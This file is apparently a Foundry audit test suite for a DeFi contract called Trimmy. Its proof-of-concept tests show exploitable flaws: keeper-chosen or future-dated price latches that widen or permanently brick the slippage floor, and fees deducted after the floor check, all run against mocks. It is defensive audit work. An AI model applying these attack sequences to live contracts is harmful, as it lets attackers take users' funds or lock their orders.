// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

import {IConfidentialTrigger} from "../../../src/Interfaces.sol";
import {Trimmy} from "../../../src/Trimmy.sol";
import {Quote} from "../../../src/Quote.sol";
import {
    MockERC20,
    MockFtsoV2,
    MockRegistry,
    MockSwapRouter,
    MockQueuedVault
} from "../../mocks/Mocks.sol";

/// @title Oracle-lens attack, third pass — findings O-15 .. O-19
/// @notice `AttackOracle.t.sol` (O-1..O-7) and `AttackOracle2.t.sol` (O-8..O-14) attack the
///         uint64 clamp, the future timestamp, the fee split and the missing vault floor. All
///         of those are properties of a SINGLE execution. This file attacks the property that
///         only exists ACROSS executions: `Rule.latchedPrice` (Trimmy.sol:89) is written once,
///         by whoever executes first, and there is no code path anywhere in Trimmy.sol that
///         ever writes it again.
///
///         Every test here uses WC2FLR -> FXRP, the direction where the O-1 uint64 clamp does
///         NOT bite (relative == 5806, well inside uint64), so nothing below is a restatement
///         of O-1/O-2.
///
/// MEASURED, Coston2, 2026-08-07, `tools/sample_latch_drift.py`. eth_call PINNED per block and
/// paired with that block's own timestamp — the methodology GROUND-TRUTH §5 requires.
///
///   1022 pinned block reads (901 contiguous @ blocks 33726995..33727895, plus 121 @ stride 400
///   spanning 28.78 h from block 33679889):
///     signed feed age (block.timestamp - feed.timestamp), BOTH legs:
///        min 0   p50 0   p99 24-25   max 32
///     readings with the feed AHEAD of the block clock: 0 / 1022 on both legs.
///
///   drift of the XRP/FLR relative price (the quantity `latchedPrice` freezes), 28.78 h window:
///     horizon    300 s : |move| p50  13.7  p99  57.1  max  60.1 bips
///     horizon   3600 s : |move| p50  22.1  p99  82.4  max 108.3 bips
///     horizon  21600 s : |move| p50  46.1  p99 133.0  max 133.0 bips
///     horizon  86400 s : |move| p50 140.3  p99 201.7  max 201.7 bips
///
///   Live feed mantissas at the time of writing, FtsoV2 0xC4e9c78EA53db782E28f28Fdf80BaF59336B304d:
///     XRP/USD 1021607 @ 6 dp   FLR/USD 593189 @ 8 dp
contract AttackOracle3Test is Test {
    address internal constant REGISTRY_ADDR = 0xaD67FE66660Fb8dFE9d6b1b4240d8650e30F6019;

    bytes21 internal constant FEED_XRP =
        bytes21(uint168(0x015852502f55534400000000000000000000000000));
    bytes21 internal constant FEED_FLR =
        bytes21(uint168(0x01464c522f55534400000000000000000000000000));

    uint256 internal constant XRP_V = 1_021_607;
    int8 internal constant XRP_D = 6;
    uint256 internal constant FLR_V = 593_189;
    int8 internal constant FLR_D = 8;

    uint64 internal constant MAX_FEED_AGE = 120; // deployed value
    uint16 internal constant SLIP = 50; // MAX_SLIPPAGE_BIPS

    /// Worst |move| of the XRP/FLR relative price over a 24 h horizon, MEASURED (see header).
    uint256 internal constant DRIFT_24H_BIPS = 201;

    Trimmy internal trimmy;
    MockERC20 internal fxrp;
    MockERC20 internal wnat;
    MockFtsoV2 internal ftso;
    MockSwapRouter internal router;
    MockQueuedVault internal vault;

    address internal account = makeAddr("personalAccount");
    address internal keeper = makeAddr("keeper");
    address internal feeSink = makeAddr("protocolFeeRecipient");

    uint8 internal constant TOK_FXRP = 0;
    uint8 internal constant TOK_WNAT = 1;
    uint8 internal constant VENUE_SWAP = 0;
    uint8 internal constant VENUE_VAULT = 1;

    function setUp() public {
        vm.warp(10 days);

        fxrp = new MockERC20("FTestXRP", "FXRP", 6);
        wnat = new MockERC20("Wrapped C2FLR", "WC2FLR", 18);

        ftso = new MockFtsoV2();
        MockRegistry registry = new MockRegistry();
        vm.etch(REGISTRY_ADDR, address(registry).code);
        MockRegistry(REGISTRY_ADDR).setFtso(address(ftso));

        router = new MockSwapRouter();
        vault = new MockQueuedVault(IERC20(address(fxrp)));

        _publish(XRP_V, FLR_V);

        Trimmy.TokenCfg[] memory tokens = new Trimmy.TokenCfg[](2);
        tokens[0] = Trimmy.TokenCfg({token: address(fxrp), feedId: FEED_XRP, decimals: 6});
        tokens[1] = Trimmy.TokenCfg({token: address(wnat), feedId: FEED_FLR, decimals: 18});

        Trimmy.VenueCfg[] memory venues = new Trimmy.VenueCfg[](2);
        venues[0] = Trimmy.VenueCfg({
            target: address(router), kind: Trimmy.VenueKind.SWAP_ROUTER_V3, feeTier: 3000
        });
        venues[1] = Trimmy.VenueCfg({
            target: address(vault), kind: Trimmy.VenueKind.QUEUED_VAULT, feeTier: 0
        });

        trimmy = new Trimmy(tokens, venues, MAX_FEED_AGE, feeSink, IConfidentialTrigger(address(0)));

        fxrp.mint(account, 1_000_000e6);
        wnat.mint(account, 1_000_000e18);
        vm.startPrank(account);
        fxrp.approve(address(trimmy), type(uint256).max);
        wnat.approve(address(trimmy), type(uint256).max);
        vm.stopPrank();
    }

    /// Publish both legs at the current block time, i.e. age 0 — the median observed on chain.
    function _publish(uint256 xrpV, uint256 flrV) internal {
        uint64 nowTs = uint64(vm.getBlockTimestamp());
        ftso.setFeed(FEED_XRP, xrpV, XRP_D, nowTs);
        ftso.setFeed(FEED_FLR, flrV, FLR_D, nowTs);
    }

    /// FXRP base units per ONE WHOLE WC2FLR, exactly as `_evaluateTrigger` computes it.
    function _rel(uint256 xrpV, uint256 flrV) internal pure returns (uint256) {
        return Quote.convert(
            1e18,
            Quote.Feed({value: flrV, decimals: FLR_D, timestamp: 0}),
            18,
            Quote.Feed({value: xrpV, decimals: XRP_D, timestamp: 0}),
            6
        );
    }

    /// A 3-part WC2FLR -> FXRP DCA rule. `nextEligibleAt` is set to `block.timestamp` by `arm`
    /// (Trimmy.sol:301), so part 1 is executable by ANY address in the very next block.
    function _dcaParams() internal view returns (Trimmy.RuleParams memory p) {
        p = Trimmy.RuleParams({
            sellTokenId: TOK_WNAT,
            buyTokenId: TOK_FXRP,
            verb: Trimmy.Verb.SWAP,
            venueId: VENUE_SWAP,
            trigger: Trimmy.Trigger.SCHEDULE,
            totalSellAmount: 300e18,
            partSellAmount: 100e18,
            minOutAbsolute: 0,
            triggerValue: 86_400, // daily DCA
            expiry: uint64(block.timestamp + 30 days),
            slippageBips: SLIP,
            protocolFeeBips: 0,
            keeperFeeFlat: 0,
            keeperFeeBudget: 0
        });
    }

    /// Make the router deliver exactly `out` FXRP units for `amountIn` wei of WC2FLR.
    /// MockSwapRouter: out = amountIn * rateWad / 1e18, then /1e12 for 18dp -> 6dp.
    function _setFill(uint256 amountIn, uint256 out) internal {
        router.setRateWad((out * 1e12 * 1e18) / amountIn);
    }

    // =======================================================================================
    // O-15. The latch is set by the FIRST executor, and the first executor is chosen by no one.
    //       A keeper picks the moment; the floor for the whole rest of the rule follows.
    // =======================================================================================

    /// PROOF OF CONCEPT — FAILS against the current code.
    ///
    /// `arm` sets `nextEligibleAt = block.timestamp` (Trimmy.sol:301) and `execute` is
    /// permissionless (Trimmy.sol:372). `latchedPrice` is written at Trimmy.sol:389 by whoever
    /// gets there first, and NOTHING in Trimmy.sol writes it again — `_advance` (596-614) does
    /// not, `_settle` (571-594) does not, `cancel` does not.
    ///
    /// So a keeper does not have to beat the oracle: it simply declines to execute until the
    /// oracle prints a low. The measured 24 h range of XRP/FLR on Coston2 is 201 bips
    /// (tools/sample_latch_drift.py), so waiting one day for a local minimum is not a
    /// hypothetical — it is the p99 of a single sampled day.
    ///
    /// Once latched low, every later part is floored at that low. The contract's advertised
    /// guarantee is `slippageBips` = 50. What this test measures is 50 + 201.
    function test_O15_keeperChosenLatchWidensTheFloorByTheWholeDailyRange() public {
        vm.prank(account);
        uint256 id = trimmy.arm(_dcaParams());

        // The keeper waits for the daily low before touching part 1. XRP strengthens against
        // FLR by the measured 24 h drift, so FLR buys 201 bips less XRP.
        uint256 xrpHigh = (XRP_V * (10_000 + DRIFT_24H_BIPS)) / 10_000;
        vm.warp(block.timestamp + 1 days);
        _publish(xrpHigh, FLR_V);

        uint256 relLow = _rel(xrpHigh, FLR_V);
        _setFill(100e18, (100 * relLow * (10_000 - SLIP)) / 10_000);
        vm.prank(keeper);
        trimmy.execute(id); // part 1 — the only purpose of this call is to write the latch

        assertEq(uint256(trimmy.ruleAt(id).latchedPrice), relLow, "latched at the keeper's low");

        // The market comes back. Part 2, one day later, at the honest price.
        vm.warp(block.timestamp + 1 days + 1);
        _publish(XRP_V, FLR_V);
        uint256 relTrue = _rel(XRP_V, FLR_V);

        // What the contract will actually demand of the venue for part 2:
        uint256 floorOut = (100e18 * relLow * (10_000 - SLIP)) / (1e18 * 10_000);
        uint256 fairOut = (100e18 * relTrue) / 1e18;
        _setFill(100e18, floorOut); // an attacker fills exactly at the floor and keeps the rest

        uint256 before = fxrp.balanceOf(account);
        vm.prank(keeper);
        trimmy.execute(id);
        uint256 got = fxrp.balanceOf(account) - before;

        console2.log("latched (stale) relative:", relLow);
        console2.log("live relative           :", relTrue);
        console2.log("fair out for part 2     :", fairOut);
        console2.log("actually delivered      :", got);
        console2.log("loss vs FTSO, bips      :", ((fairOut - got) * 10_000) / fairOut);

        assertGe(
            got,
            (fairOut * (10_000 - SLIP)) / 10_000,
            "O-15: a permanent latch makes slippageBips meaningless on parts 2..n"
        );
    }

    // =======================================================================================
    // O-16. The same write, the other sign: latching HIGH is a permanent denial of service,
    //       and it costs an attacker exactly one execution.
    // =======================================================================================

    /// PROOF OF CONCEPT — FAILS against the current code.
    ///
    /// The floor is `amountIn * latchedPrice / 10**sellDec * (1 - slippage)` (Trimmy.sol:466-468)
    /// and `latchedPrice` never moves. If part 1 is executed at a local MAXIMUM, every later
    /// part demands a price the market no longer offers. There is no refresh, no decay and no
    /// reset: `grep -n latchedPrice src/Trimmy.sol` finds exactly two sites, the declaration
    /// (89) and the one-time write (389).
    ///
    /// The attacker's cost is one honest execution at a price they were happy to pay. The
    /// victim's cost is the rest of the rule — up to MAX_RULE_LIFETIME = 365 days — during
    /// which the allowance stays live and the rule cannot be executed by anyone.
    function test_O16_latchingAtALocalMaximumBricksTheRuleForItsWholeLife() public {
        vm.prank(account);
        uint256 id = trimmy.arm(_dcaParams());

        // Attacker executes part 1 at a local high: FLR buys 201 bips MORE XRP than typical.
        uint256 xrpLow = (XRP_V * (10_000 - DRIFT_24H_BIPS)) / 10_000;
        _publish(xrpLow, FLR_V);
        uint256 relHigh = _rel(xrpLow, FLR_V);
        _setFill(100e18, (100 * relHigh * 10_001) / 10_000);

        vm.prank(keeper);
        trimmy.execute(id);
        assertEq(uint256(trimmy.ruleAt(id).latchedPrice), relHigh, "latched at the local maximum");

        // The market returns to normal and STAYS there. Every later part is floored 201 bips
        // above the market, which is 4x the 50-bip band the rule authorised.
        uint256 relTrue = _rel(XRP_V, FLR_V);
        // test fixture: the intermediate is a pre-scaled oracle quote, so the ordering is deliberate and the precision loss is the quantity under test.
        // forge-lint: disable-next-line(divide-before-multiply)
        uint256 floorOut = (((100e18 * relHigh) / 1e18) * (10_000 - SLIP)) / 10_000;
        console2.log("floor still demanded  :", floorOut);
        console2.log("fair value at market  :", (100e18 * relTrue) / 1e18);

        for (uint256 day = 1; day <= 28; day++) {
            vm.warp(block.timestamp + 1 days + 1);
            _publish(XRP_V, FLR_V);
            _setFill(100e18, (100e18 * relTrue) / 1e18); // an HONEST fill at the live oracle price
            vm.prank(keeper);
            try trimmy.execute(id) {
                revert("executed");
            } catch {
                // reverts every single day for the rest of the rule's 30-day life
            }
        }

        // `spent` is still exactly one part: 28 consecutive honest attempts all reverted.
        console2.log("parts filled after 28 honest days:", trimmy.ruleAt(id).spent / 100e18);
        assertGt(
            trimmy.ruleAt(id).spent,
            100e18,
            "O-16: after one attacker execution NO further part ever cleared the frozen floor"
        );
    }

    // =======================================================================================
    // O-17. The FTSO floor is checked on GROSS proceeds. Fees are then taken out of the
    //       amount that just cleared it, so the account's floor is not the floor.
    // =======================================================================================

    /// PROOF OF CONCEPT — FAILS against the current code.
    ///
    /// Trimmy.sol:493 asserts `actualOut >= floorOut` and then Trimmy.sol:583-591 removes
    /// `keeperFee` and `protocolFee` from that same `actualOut` before the remainder reaches
    /// `r.account`. Nothing re-checks the remainder against the oracle.
    ///
    /// `MAX_PROTOCOL_FEE_BIPS` is 50 (Trimmy.sol:137), the same size as `MAX_SLIPPAGE_BIPS`, so
    /// the account-visible band is 2x what the slippage parameter names — before the flat
    /// keeper fee, which has no cap at all beyond `keeperFeeBudget`.
    function test_O17_theFloorIsOnGrossProceedsNotOnWhatTheAccountReceives() public {
        Trimmy.RuleParams memory p = _dcaParams();
        p.totalSellAmount = 100e18;
        p.partSellAmount = 100e18;
        p.protocolFeeBips = 50; // MAX_PROTOCOL_FEE_BIPS
        p.keeperFeeFlat = 1_000; // 0.001 FXRP per execution
        p.keeperFeeBudget = 1_000;

        vm.prank(account);
        uint256 id = trimmy.arm(p);

        uint256 relTrue = _rel(XRP_V, FLR_V);
        uint256 oracleOut = (100e18 * relTrue) / 1e18;
        uint256 floorOut = (oracleOut * (10_000 - SLIP)) / 10_000;
        _setFill(100e18, floorOut); // the venue fills exactly at the floor: the floor "held"

        uint256 before = fxrp.balanceOf(account);
        vm.prank(keeper);
        trimmy.execute(id);
        uint256 got = fxrp.balanceOf(account) - before;

        console2.log("oracle value of the part:", oracleOut);
        console2.log("floor the venue cleared :", floorOut);
        console2.log("what the account got    :", got);
        console2.log("account loss vs FTSO, bp:", ((oracleOut - got) * 10_000) / oracleOut);

        assertGe(got, floorOut, "O-17: the account receives strictly less than the checked floor");
    }

    // =======================================================================================
    // O-18. O-4 (unbounded future timestamp) composes with the permanent latch: ONE
    //       future-dated read poisons the floor for the rest of the rule.
    // =======================================================================================

    /// PROOF OF CONCEPT — FAILS against the current code.
    ///
    /// `Quote.requireFresh` (Quote.sol:54) only measures age on the `block.timestamp >
    /// feed.timestamp` branch, so a future-dated feed is age zero however far ahead and
    /// whatever price it carries. O-4 shows that single read is accepted. This shows the
    /// damage does not end with that read: the accepted price is written into `latchedPrice`
    /// and becomes the floor for every subsequent part, long after the feed is honest again.
    ///
    /// The justification in Quote.sol:48-51 is "a feed one second ahead of the block clock is
    /// normal". MEASURED over 1022 pinned Coston2 block reads on both allowlisted feeds:
    /// `min(block.timestamp - feed.timestamp) == 0`, and 0/1022 readings had the feed ahead.
    /// The unbounded branch is buying liveness that was never observed to be at risk.
    function test_O18_oneFutureDatedReadPoisonsTheFloorPermanently() public {
        vm.prank(account);
        uint256 id = trimmy.arm(_dcaParams());

        // A single future-dated publication carrying a price 20% away from the market.
        uint64 future = uint64(block.timestamp + 365 days);
        uint256 xrpBad = (XRP_V * 12_000) / 10_000;
        ftso.setFeed(FEED_XRP, xrpBad, XRP_D, future);
        ftso.setFeed(FEED_FLR, FLR_V, FLR_D, future);

        uint256 relPoison = _rel(xrpBad, FLR_V);
        _setFill(100e18, (100 * relPoison * (10_000 - SLIP)) / 10_000);
        vm.prank(keeper);
        trimmy.execute(id);

        assertEq(uint256(trimmy.ruleAt(id).latchedPrice), relPoison, "poisoned latch is written");

        // Feeds are honest from here on. It does not matter.
        vm.warp(block.timestamp + 1 days + 1);
        _publish(XRP_V, FLR_V);
        uint256 relTrue = _rel(XRP_V, FLR_V);
        // test fixture: the intermediate is a pre-scaled oracle quote, so the ordering is deliberate and the precision loss is the quantity under test.
        // forge-lint: disable-next-line(divide-before-multiply)
        uint256 floorOut = (((100e18 * relPoison) / 1e18) * (10_000 - SLIP)) / 10_000;
        uint256 fairOut = (100e18 * relTrue) / 1e18;
        _setFill(100e18, floorOut);

        uint256 before = fxrp.balanceOf(account);
        vm.prank(keeper);
        trimmy.execute(id);
        uint256 got = fxrp.balanceOf(account) - before;

        console2.log("fair out :", fairOut);
        console2.log("delivered:", got);
        assertGe(
            got,
            (fairOut * (10_000 - SLIP)) / 10_000,
            "O-18: a future-dated feed is not a one-block problem, it is a whole-rule problem"
        );
    }

    // =======================================================================================
    // O-19. maxFeedAge = 120 s is immutable and 3.75x the measured worst case, and even the
    //       5-minute realised move already exceeds the entire slippage budget.
    // =======================================================================================

    /// MEASURED, `tools/sample_latch_drift.py`, 1022 pinned Coston2 block reads:
    ///   max observed feed age .......... 32 s   (both legs)
    ///   deployed maxFeedAge ............ 120 s  (immutable, Trimmy.sol:143)
    ///   max |d(XRP/FLR)| over 300 s .... 60.1 bips
    ///   MAX_SLIPPAGE_BIPS .............. 50
    /// The staleness window is sized 3.75x above anything observed, and the price move over a
    /// window only 2.5x wider than that already exceeds the whole authorised band on its own.
    function test_O19a_stalenessWindowIsOversizedAgainstItsOwnMeasurement() public pure {
        uint256 measuredMaxAge = 32;
        uint256 deployedMaxAge = 120;
        console2.log(
            "maxFeedAge / measured max age (x100):", (deployedMaxAge * 100) / measuredMaxAge
        );
        assertLe(
            deployedMaxAge,
            measuredMaxAge * 2,
            "O-19: 120 s is 3.75x the measured worst case; nothing measured justifies it"
        );
    }

    /// The same measurement from the other side: the realised move over a horizon only 2.5x
    /// wider than the staleness window already exceeds the whole authorised band.
    function test_O19b_fiveMinuteRealisedMoveExceedsTheWholeSlippageBudget() public pure {
        uint256 move300sBips = 60; // floor of 60.1, measured over 28.78 h
        console2.log("max |d(XRP/FLR)| over 300 s, bips:", move300sBips);
        console2.log("MAX_SLIPPAGE_BIPS               :", uint256(SLIP));
        assertLe(move300sBips, SLIP, "O-19: a 5-minute move already exceeds the 50-bip band");
    }
}
